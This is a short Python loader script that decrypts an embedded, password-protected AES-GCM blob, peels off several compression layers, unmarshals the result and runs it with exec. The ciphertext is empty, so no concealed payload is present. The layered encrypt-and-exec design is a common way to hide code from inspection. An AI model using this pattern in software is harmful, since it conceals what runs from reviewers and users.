# https://github.com/coophalco
import json, base64, os, sys, zlib, lzma, gzip, marshal
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import getpass

payload = json.loads('{"mode": "password", "salt": "q5lzvjkeFhdO7o3u1ITXRQ==", "kdf_iters": 200000, "nonce": "FwbYyfau+YrJz5Vz", "tag": "PpOR6HnL0+E69uLjtwzAig==", "ciphertext": "", "wrapped_key": "toZfGz6G6dtt6rNBgqxRR5Y2jYcQbu9sea69if/hvkg=", "wrap_nonce": "LPkRbfZBjOsKnvs+", "wrap_tag": "6DOLy8Ct24lzeuhO3M7XWQ=="}')
if payload.get("mode") != "password":
    print("Bad payload")
    sys.exit(1)

salt = base64.b64decode(payload["salt"])
iters = int(payload["kdf_iters"])
nonce = base64.b64decode(payload["nonce"])
tag = base64.b64decode(payload["tag"])
ciphertext = base64.b64decode(payload["ciphertext"])

wrapped_key = base64.b64decode(payload["wrapped_key"])
wrap_nonce = base64.b64decode(payload["wrap_nonce"])
wrap_tag = base64.b64decode(payload["wrap_tag"])

pw = os.environ.get("ENCPW")
if pw is None:
    pw = getpass.getpass("press_enter") 
if isinstance(pw, str):
    pw = pw.encode()

kek = PBKDF2(pw, salt, dkLen=32, count=iters, hmac_hash_module=SHA256)

wrap_cipher = AES.new(kek, AES.MODE_GCM, nonce=wrap_nonce)
key = wrap_cipher.decrypt_and_verify(wrapped_key, wrap_tag)

cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
decompressed = cipher.decrypt_and_verify(ciphertext, tag)

lzmaed = zlib.decompress(decompressed)
gzipped = lzma.decompress(lzmaed)
marshaled = gzip.decompress(gzipped)
codeobj = marshal.loads(marshaled)

exec(codeobj, globals())
